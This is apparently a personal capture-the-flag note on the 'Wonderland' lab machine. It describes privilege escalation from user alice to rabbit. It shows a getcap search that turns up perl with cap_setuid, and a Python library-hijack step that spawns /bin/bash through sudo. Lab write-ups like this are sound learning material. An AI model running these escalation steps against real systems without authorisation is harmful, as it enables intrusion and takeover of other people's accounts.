
I got the low level shell which means it's time to escalate babyyyyyyyyyyyyyyyyyyyyyy

![[Pasted image 20231101214359.png]]

We are almost denied to enter into any users 
i.e. there are 3-4 users but let's get the tools from our back pocket and use them
![[Pasted image 20231101214719.png]]

Luckily we were able to run the automated script before going manually

```
alice@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
My intuition say's that we should dig deeper for capabilities 


![[Pasted image 20231101231011.png]]

Volla we got elevated to another user which is rabbit here
![[Pasted image 20231101233625.png]]
```
import os 
os.system("/bin/bash")
```

```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

